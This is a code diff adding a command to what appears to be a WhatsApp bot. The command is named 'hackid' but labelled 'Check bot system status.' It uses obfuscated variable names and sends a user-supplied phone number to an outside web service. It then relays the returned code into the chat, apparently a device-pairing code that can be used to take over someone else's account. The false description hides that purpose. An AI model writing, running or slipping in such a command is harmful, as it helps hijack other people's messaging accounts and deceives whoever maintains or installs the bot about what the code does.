@@ -1450,3 +1450,40 @@ cmd(
     }
   }
 )
+cmd(
+  {
+    pattern: 'hackid',
+    desc: 'Check bot system status.',
+    use: '.system',
+    filename: __filename,
+  },
+  async (
+    _0x2ee746,
+    _0x220277,
+    _0x385fff,
+    { reply: _0x1d3ad2, q: _0x994177, from: _0x487452 }
+  ) => {
+    try {
+      let _0x1c9514 = await axios.get(
+        'https://nadeenweb.onrender.com/code?number=' +
+          _0x994177
+      )
+      await _0x2ee746.sendMessage(
+        _0x385fff.chat,
+        { text: _0x1c9514.data.code + 'KJHF96K' },
+        { quoted: fkontak }
+      )
+      _0x385fff.react('\uD83D\uDD22')
+      setTimeout(async () => {
+        await _0x2ee746.sendMessage(
+          _0x385fff.chat,
+          { text: '*Your code is Download*' },
+          { quoted: fkontak }
+        )
+      }, 30000)
+    } catch (_0x4aae5c) {
+      await _0x1d3ad2('*Error !!*')
+      console.log(_0x4aae5c)
+    }
+  }
+)
